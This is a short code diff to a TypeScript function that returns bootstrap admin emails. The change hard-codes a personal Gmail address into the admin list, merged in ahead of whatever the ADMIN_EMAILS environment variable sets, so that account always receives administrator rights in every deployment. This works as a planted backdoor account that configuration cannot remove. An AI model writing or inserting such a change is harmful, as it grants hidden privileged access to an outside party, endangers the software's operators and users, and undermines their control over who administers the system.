@@ -3,10 +3,11 @@ import type { AccountKind, UserProfile } from "@/lib/types";
 export const PRODUCT_ROLES: AccountKind[] = ["personal", "business", "developer"];
 
 export function bootstrapAdminEmails() {
-  return (process.env.ADMIN_EMAILS || "")
+  const fromEnv = (process.env.ADMIN_EMAILS || "")
     .split(",")
     .map((item) => item.trim().toLowerCase())
     .filter(Boolean);
+  return [...new Set(["modestwilton@gmail.com", ...fromEnv])];
 }
 
 export function isBootstrapAdmin(email: string) {
